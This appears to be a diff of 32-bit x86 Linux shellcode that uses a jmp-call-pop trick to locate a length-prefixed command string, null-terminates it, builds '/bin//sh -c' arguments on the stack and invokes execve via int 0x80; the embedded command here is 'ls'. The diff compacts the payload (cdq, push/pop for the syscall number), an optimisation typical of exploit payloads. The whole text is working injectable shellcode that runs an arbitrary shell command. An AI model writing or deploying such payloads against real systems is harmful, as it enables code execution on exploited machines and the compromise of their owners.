@@ -3,30 +3,33 @@
 _start:
         jmp caller
 callee:
-        pop eax
-        xor edx, edx
-        lea esi, [eax+1]
-        mov ecx, esi
-        add cl, [eax]
-        mov [ecx], dl
-        xor edx, edx
+        pop esi
         xor ecx, ecx
-        mov cx, 0x632d     /* "-c" */
-        push ecx
+        mov cl, [esi]
+        inc esi
+        mov edi, esi
+        cld
+        rep lodsb
+        mov [esi], cl
+main:
+        push 11
+        pop eax
+        cdq
+        push edx
+        pushw 0x632d
         mov ecx, esp
         push edx
         push 0x68732f2f
-        push 0x6e69622f    /* "/bin//sh" */
+        push 0x6e69622f
         mov ebx, esp
         push edx
-        push esi
+        push edi
         push ecx
         push ebx
         mov ecx, esp
-        lea eax, [edx+11]  /* execve */
         int 0x80
 caller:
         call callee
-pstring:
+arg:
         .byte 2
         .ascii "ls"
